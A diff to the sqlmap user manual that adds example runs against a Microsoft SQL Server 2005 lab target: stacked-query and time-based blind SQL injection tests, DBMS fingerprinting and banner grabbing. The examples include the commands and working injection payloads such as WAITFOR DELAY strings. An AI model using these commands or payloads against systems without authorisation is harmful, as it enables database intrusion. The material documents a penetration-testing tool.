@@ -1851,6 +1851,23 @@ stacked queries support:    'id=1; SELECT pg_sleep(5);-- AND 3128=3128'
 </CODE></BLOCKQUOTE>
 </P>
 
+<P>Example on a <B>Microsoft SQL Server 2005 Service Pack 0</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" \
+  --stacked-test -v 1
+
+[...]
+back-end DBMS: Microsoft SQL Server 2005
+
+[hh:mm:09] [INFO] testing stacked queries support on parameter 'name'
+[hh:mm:23] [INFO] the web application supports stacked queries on parameter 'name'
+stacked queries support:    'name=luther'; WAITFOR DELAY '0:0:5';-- AND 'wRcBC'='wRcBC'
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
 
 <H3>Test for Time based blind SQL injection</H3>
 
@@ -1897,6 +1914,25 @@ query syntax
 [hh:mm:35] [INFO] the parameter 'id' is affected by a time based blind sql injection 
 with stacked query syntax
 time based blind sql injection payload:    'id=1; SELECT pg_sleep(5);-- AND 9644=9644'
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
+<P>Example on a <B>Microsoft SQL Server 2005 Service Pack 0</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" \
+  --time-test -v 1
+
+[...]
+back-end DBMS: Microsoft SQL Server 2005
+
+[15:32:59] [INFO] testing time based blind sql injection on parameter 'name' with AND condition syntax
+[15:32:59] [WARNING] the parameter 'name' is not affected by a time based blind sql injection with AND condition syntax
+[15:32:59] [INFO] testing time based blind sql injection on parameter 'name' with stacked query syntax
+[15:33:13] [INFO] the parameter 'name' is affected by a time based blind sql injection with stacked query syntax
+time based blind sql injection payload:    'name=luther'; WAITFOR DELAY '0:0:5';-- AND 'PmrXn'='PmrXn'
 </PRE>
 </CODE></BLOCKQUOTE>
 </P>
@@ -2289,6 +2325,29 @@ back-end DBMS:  active fingerprint: Microsoft SQL Server 2000
 </CODE></BLOCKQUOTE>
 </P>
 
+<P>Example on a <B>Microsoft SQL Server 2005 Service Pack 0</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f
+
+[...]
+[hh:mm:51] [WARNING] the back-end DMBS is not PostgreSQL
+[hh:mm:51] [INFO] testing Microsoft SQL Server
+[hh:mm:51] [INFO] query: LTRIM(STR(LEN(0)))
+[hh:mm:51] [INFO] retrieved: 1
+[hh:mm:51] [INFO] performed 13 queries in 0 seconds
+[hh:mm:51] [INFO] query: SELECT SUBSTRING((@@VERSION), 25, 1)
+[hh:mm:51] [INFO] retrieved: 5
+[hh:mm:51] [INFO] performed 13 queries in 0 seconds
+web server operating system: Windows 2003 or 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS: active fingerprint: Microsoft SQL Server 2005
+               html error message fingerprint: Microsoft SQL Server
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
 <P>If you want an even more accurate result, based also on banner parsing,
 you can also provide the <CODE>-b</CODE> or <CODE>--banner</CODE> option.</P>
 
@@ -2372,6 +2431,40 @@ back-end DBMS:  active fingerprint: Microsoft SQL Server 2000
 </CODE></BLOCKQUOTE>
 </P>
 
+<P>Example on a <B>Microsoft SQL Server 2005 Service Pack 0</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 1 -f -b
+
+[...]
+[hh:mm:03] [WARNING] the back-end DMBS is not PostgreSQL
+[hh:mm:03] [INFO] testing Microsoft SQL Server
+[hh:mm:03] [INFO] query: LTRIM(STR(LEN(8)))
+[hh:mm:03] [INFO] retrieved: 1
+[hh:mm:03] [INFO] performed 13 queries in 0 seconds
+[hh:mm:03] [INFO] query: SELECT SUBSTRING((@@VERSION), 25, 1)
+[hh:mm:03] [INFO] retrieved: 5
+[hh:mm:03] [INFO] performed 13 queries in 0 seconds
+[hh:mm:03] [INFO] query: @@VERSION
+[hh:mm:03] [INFO] retrieved: Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+        Oct 14 2005 00:33:37 
+        Copyright (c) 1988-2005 Microsoft Corporation
+        Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 1)
+
+[hh:mm:15] [INFO] performed 1343 queries in 11 seconds
+web server operating system: Windows 2003 or 2000
+web application technology: ASP.NET, Microsoft IIS 6.0, ASP
+back-end DBMS operating system: Windows 2003 Service Pack 1
+back-end DBMS: active fingerprint: Microsoft SQL Server 2005
+               banner parsing fingerprint: Microsoft SQL Server 2005 Service Pack 0 
+               version 9.00.1399
+               html error message fingerprint: Microsoft SQL Server
+[...]
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
 <P>As you can see, from the Microsoft SQL Server banner, sqlmap was able to
 correctly identify the database management system patch level.
 The Microsoft SQL Server XML versions file is the result of a sqlmap
@@ -2439,6 +2532,23 @@ Microsoft SQL Server  2000 - 8.00.194 (Intel X86)
         Aug  6 2000 00:57:48 
         Copyright (c) 1988-2000 Microsoft Corporation
         Standard Edition on Windows NT 5.0 (Build 2195: Service Pack 4)
+---
+</PRE>
+</CODE></BLOCKQUOTE>
+</P>
+
+<P>Example on a <B>Microsoft SQL Server 2005 Service Pack 0</B> target:</P>
+<P>
+<BLOCKQUOTE><CODE>
+<PRE>
+$ python sqlmap.py -u "http://192.168.123.36/sqlmap/get_str.asp?name=luther" -v 0 -b
+
+banner:
+---
+Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) 
+        Oct 14 2005 00:33:37 
+        Copyright (c) 1988-2005 Microsoft Corporation
+        Enterprise Edition on Windows NT 5.2 (Build 3790: Service Pack 1)
 ---
 </PRE>
 </CODE></BLOCKQUOTE>
